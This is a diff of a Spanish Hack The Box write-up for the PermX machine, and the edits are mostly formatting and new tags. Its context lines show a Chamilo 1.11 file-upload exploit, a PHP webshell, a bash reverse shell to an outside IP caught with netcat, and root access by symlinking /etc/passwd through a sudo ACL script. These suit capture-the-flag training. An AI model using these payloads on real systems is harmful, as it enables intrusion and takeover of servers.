@@ -23,9 +23,13 @@ tags:
   - http
   - ssh
   - tcp
+  - symlink abuse
+  - php
+  - interactive tty
   - information gathering
   - web analysis
   - cve exploitation
+  - lateral movement
   - privilege escalation
 
 ---
@@ -111,11 +115,11 @@ http://lms.permx.htb [200 OK] Apache[2.4.52], Bootstrap, Chamilo[1], Cookies[Got
 
 ![](/assets/img/htb-writeup-permx/permx2.png)
 
-El subdominio cuenta con el archivo 'robots.txt', del que se puede extraer mucha información.
+El subdominio cuenta con el archivo `robots.txt`, del que se puede extraer mucha información.
 
 ![](/assets/img/htb-writeup-permx/permx3.png)
 
-Concretamente, se puede encontrar la versión exacta del software que se emplea (Chamilo 1.11).
+Concretamente, se puede encontrar la versión exacta del software que se emplea `(Chamilo 1.11)`.
 
 ![](/assets/img/htb-writeup-permx/permx4.png)
 
@@ -134,7 +138,7 @@ Al buscar en la dirección, el directorio está repleto de reverse shells de otr
 
 ![](/assets/img/htb-writeup-permx/permx5.png)
 
-El PoC es muy sencillo, simplemente hay que crear un archivo PHP que ejecute un comando en el sistema y, con 'curl', subirlo a la página.
+El PoC es muy sencillo, simplemente hay que crear un archivo PHP que ejecute un comando en el sistema y, con curl, subirlo a la página.
 
 ```terminal
 /home/kali/Documents/htb/machines/permx:-$ echo '<?php system("id"); ?>' > rce1.php
@@ -142,18 +146,18 @@ El PoC es muy sencillo, simplemente hay que crear un archivo PHP que ejecute un 
 The file has successfully been uploaded.
 ```
 
-Si actualizo `http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/`, se puede apreciar que el archivo rce1.php está subido.
+Si actualizo `http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/`, se puede apreciar que el archivo `rce1.php` está subido.
 
 ![](/assets/img/htb-writeup-permx/permx6.png)
 
-Ahora se puede ejecutar el archivo PHP para que proporcione el 'id' del usuario.
+Ahora se puede ejecutar el archivo PHP para que proporcione el `id` del usuario.
 
 ```terminal
 /home/kali/Documents/htb/machines/permx:-$ curl 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/rce1.php'
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
-Una forma de conseguir acceso al sistema sería compartiendo un 'index.html' que contenga una reverse shell en bash.
+Una forma de conseguir acceso al sistema sería compartiendo un `index.html` que contenga una reverse shell en bash.
 
 ```
 /home/kali/Documents/htb/machines/permx:-$ echo '<?php system($_GET["cmd"]); ?>' > rce2.php
@@ -167,9 +171,9 @@ www-data
 /home/kali/Documents/htb/machines/permx:-$ echo '#!/bin/bash\n\nbash -i >& /dev/tcp/10.10.16.3/4443 0>&1' > index.html
 ```
 
-Luego de crear el archivo 'index', levanto un servidor con Python para compartir el archivo.
+Luego de crear el archivo `index`, levanto un servidor con Python para compartir el archivo.
 
-Ejecutando un 'curl' hacia mi IP, la página 'lms.permx.htb' accede correctamente al archivo.
+Ejecutando un curl hacia mi IP, la página `lms.permx.htb` accede correctamente al archivo.
 
 ```terminal
 /home/kali/Documents/htb/machines/permx:-$ python3 -m http.server 80
@@ -179,7 +183,7 @@ Ejecutando un 'curl' hacia mi IP, la página 'lms.permx.htb' accede correctament
 
 ![](/assets/img/htb-writeup-permx/permx7.png)
 
-Solo queda ponerme a la escucha con Netcat y lanzar el 'curl' nuevamente, agregándole al final el comando 'bash' para que se ejecute la reverse shell.
+Solo queda ponerme a la escucha con Netcat y lanzar el curl nuevamente, agregándole al final el comando bash para que se ejecute la reverse shell.
 
 ```terminal
 /home/kali/Documents/htb/machines/permx:-$ nc -lvnp 4443
@@ -188,6 +192,9 @@ Solo queda ponerme a la escucha con Netcat y lanzar el 'curl' nuevamente, agreg�
 ```
 
 ![](/assets/img/htb-writeup-permx/permx8.png)
+
+---
+## Lateral Movement
 
 Realizo el tratamiento de la TTY.
 
@@ -200,7 +207,7 @@ www-data@pemrx:/var/www/chamilo/main/inc/lib/javascript/bigupload/files$ export 
 www-data@pemrx:/var/www/chamilo/main/inc/lib/javascript/bigupload/files$ stty rows 40 columns 176
 ```
 
-Utilicé Linpeas para encontrar las credenciales del usuario 'mtz' en el archivo de configuración.
+Utilicé Linpeas para encontrar las credenciales del usuario `mtz` en el archivo de configuración.
 
 ```
 www-data@pemrx:/var/www/chamilo$ cat app/config/configuration.php | head -30
@@ -221,7 +228,7 @@ mtz@permx:~$ cat user.txt
 ---
 ## Privilege Escalation
 
-Se puede ejecutar el archivo '/opt/acl.sh' como sudo sin contraseña.
+Se puede ejecutar el archivo `/opt/acl.sh` como sudo sin contraseña.
 
 ```terminal
 mtz@permx:~$ sudo -l
@@ -244,9 +251,9 @@ mtz@permx:~$ sudo /opt/acl.sh
 Usage: /opt/acl.sh user perm file
 ```
 
-Este script toma el usuario, los permisos y el archivo de destino como parámetros, y cambia los permisos de este archivo. El archivo de destino debe estar en '/home/mtz'.
+Este script toma el usuario, los permisos y el archivo de destino como parámetros, y cambia los permisos de este archivo. El archivo de destino debe estar en `/home/mtz`.
 
-Por tanto, se puede crear un enlace simbólico al archivo '/etc/passwd' y, con el script, darle acceso de lectura, escritura y ejecución al usuario 'mtz'.
+Por tanto, se puede crear un enlace simbólico al archivo `/etc/passwd` y, con el script, darle acceso de lectura, escritura y ejecución al usuario `mtz`.
 
 ```terminal
 mtz@permx:~$ ln -s /etc/passwd passwd
@@ -259,7 +266,7 @@ mtz@permx:~$ nano passwd
 
 ![](/assets/img/htb-writeup-permx/permx11.png)
 
-De esta forma, se puede crear un hash de una contraseña y asignárselo al usuario 'root' en el enlace simbólico.
+De esta forma, se puede crear un hash de una contraseña y asignárselo al usuario `root` en el enlace simbólico.
 
 ```terminal
 mtz@permx:~$ openssl passwd
